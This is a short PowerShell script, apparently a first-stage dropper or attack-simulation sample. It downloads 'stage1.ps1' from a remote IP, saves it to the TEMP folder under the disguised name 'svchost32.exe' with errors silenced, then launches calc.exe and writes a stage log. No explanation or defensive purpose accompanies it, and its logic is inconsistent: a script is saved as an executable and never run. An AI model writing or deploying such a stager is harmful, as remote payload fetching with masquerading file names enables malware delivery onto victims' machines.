<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://198.51.100.17/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\svchost32.exe",
    [int]$RequestTimeout = 11
)
try { Invoke-WebRequest -Uri $Stage1Url -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3 } catch { Write-Warning "Remote fetch failed" }
